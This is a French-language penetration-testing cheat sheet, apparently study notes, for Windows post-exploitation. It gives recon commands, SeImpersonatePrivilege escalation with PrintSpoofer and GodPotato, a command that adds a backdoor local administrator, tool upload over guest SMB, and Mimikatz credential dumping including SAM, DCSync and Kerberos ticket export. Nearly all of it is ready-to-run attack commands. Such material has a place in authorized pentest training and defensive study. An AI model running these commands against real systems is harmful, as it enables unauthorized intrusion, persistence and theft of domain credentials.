## 1. Reconnaissance initiale (dès l'obtention d'un shell)

```cmd
whoami /all          ; compte, groupes, privilèges
systeminfo           ; OS, domaine, hotfixes
ipconfig /all        ; réseau, DNS (→ souvent pointe vers le DC)
net user             ; comptes locaux
net localgroup administrators
net group "Domain Admins" /domain
nltest /dclist:<domain>
echo %logonserver%
```

**Ce qu'on cherche :**

- `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` → Potato attacks
- Compte de service IIS/SQL → souvent surprivilégié
- Admins locaux qui sont aussi comptes de domaine

---

## 2. Privilege Escalation — SeImpersonatePrivilege

> Cas typique : shell IIS (`IIS AppPool\DefaultAppPool`), SQL Server, etc.

### Outil recommandé selon l'OS

|OS|Outil|
|---|---|
|Windows Server 2019 / Win 10+|**PrintSpoofer** ou **GodPotato**|
|Windows Server 2016 / Win 8-10|**JuicyPotato**|
|Tous|**GodPotato** (le plus universel)|

### PrintSpoofer

```cmd
PrintSpoofer64.exe -i -c "cmd.exe"
PrintSpoofer64.exe -i -c "whoami"
; Objectif : obtenir NT AUTHORITY\SYSTEM
```

### GodPotato

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"
```

**Upload via SMB** si accès au webroot :

 ```bash
 smbclient //<IP>/<share> -U "guest" --no-pass
 put PrintSpoofer64.exe
 put mimikatz.exe
 ```

---

## 3. Dump de credentials avec Mimikatz

> Nécessite un shell **SYSTEM** ou **Administrator** avec `privilege::debug`

### Commandes principales

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

### Ce que chaque module donne

|Module|Résultat|
|---|---|
|`sekurlsa::logonpasswords`|Hash NTLM + passwords en clair des sessions actives|
|`lsadump::sam`|Hashes des comptes locaux (SAM)|
|`lsadump::dcsync /domain:<dom> /all`|Tous les hashes du domaine (depuis un DA)|
|`sekurlsa::tickets`|Tickets Kerberos en mémoire|
|`kerberos::list /export`|Export des tickets .kirbi|

